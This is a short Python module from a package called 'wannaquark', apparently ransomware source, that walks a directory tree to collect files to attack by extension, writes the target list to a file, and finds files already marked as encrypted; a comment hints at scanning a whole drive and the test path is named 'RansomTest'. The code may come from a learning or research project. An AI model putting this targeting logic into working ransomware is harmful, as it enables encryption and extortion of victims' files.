
import os
from wannaquark.utils.constants import Constants as Cte
from wannaquark.utils.tools import get_file_ext


def get_targets(target_dir, serach_by, tuple_target=None):
    file_paths, criteria = [], ''
    for root, dirs, files in os.walk(target_dir):  # ('C\\'):
        for file in files:
            if serach_by == 'extension':
                extension = get_file_ext(file)
                if (tuple_target and extension in tuple_target) or not tuple_target:
                    file_paths.append(root + '/' + file)
            elif serach_by == 'encrypted':
                if Cte.ENCRYPT_TAG in file and Cte.DECRYPT_TAG not in file:
                    file_paths.append(root + '/' + file)

    return file_paths


def write_file_targets(target_dir, tuple_target_ext, serach_by, write_targets=False):
    file_paths = get_targets(target_dir, serach_by, tuple_target_ext)
    if write_targets:
        with open(Cte.TARGETS_FILENAME, 'w') as f:
            f.write(str(file_paths).strip("'[]'"))
    return file_paths


def get_encrypted_files(target_dir):
    file_paths = []
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            if Cte.ENCRYPT_TAG in file:
                target_file = root + '/' + file
                file_paths.append(target_file)
    return file_paths


if __name__ == "__main__":
    get_encrypted_files('/home/user/Desktop/RansomTest/test')




